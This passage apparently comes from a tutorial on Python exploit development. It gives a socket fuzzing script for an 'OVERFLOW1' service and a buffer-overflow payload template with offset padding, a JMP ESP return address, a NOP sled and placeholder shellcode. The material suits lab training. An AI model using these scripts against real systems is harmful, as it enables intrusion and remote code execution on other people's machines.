#!/usr/bin/env python3
import socket
import sys
import time

ip = "192.168.1.50"  # Target Machine IP
port = 1337
timeout = 5
prefix = "OVERFLOW1 "  # Command or protocol prefix expected by the app

# Start with 100 'A's and increase length in the loop if needed
string = prefix + ("A" * 100)

try:
  with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.settimeout(timeout)
    s.connect((ip, port))
    s.recv(1024)  # Receive initial banner from server
    print(f"Sending {len(string)} bytes...")
    s.send(bytes(string, "latin-1"))
except Exception as e:
  print(f"Connection failed or program crashed: {e}")
```

---

### Example 2: Python Exploit Payload Structure
Once you find the crash offset and the memory address to hijack execution (such as a `JMP ESP` instruction), you use Python to assemble a structured exploit payload. 

```python
#!/usr/bin/env python3
import struct

# 1. Padding to fill the buffer up to the return address offset
offset = 2003
buffer = b"TRUN /.:/ " + b"A" * offset 

# 2. Overwriting the Return Address / Pointer (e.g., pointing to JMP ESP)
# Packed in little-endian format
ret_address = struct.pack('<I', 0x625011AF)  # Example memory address
buffer += ret_address

# 3. NOP Sled (No-Operation instructions \x90) to act as a runway for the CPU
buffer += b"\x90" * 16 

# 4. Shellcode (the actual malicious payload or reverse shell instructions)
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68..."  # Placeholder shellcode
buffer += shellcode

# Send 'buffer' to the vulnerable target via socket or stdout
```

---

### Key Python Features Used in Exploit Development
* **String Multiplication:** Commands like `b"A" * 500` quickly generate precise padding lengths needed to overflow buffers.
* **`struct` Module:** `struct.pack('<I', address)` converts integer memory addresses into raw little-endian byte format required by binary architectures.
* **`socket` Module:** Connects Python directly to TCP/UDP ports running vulnerable network daemons.
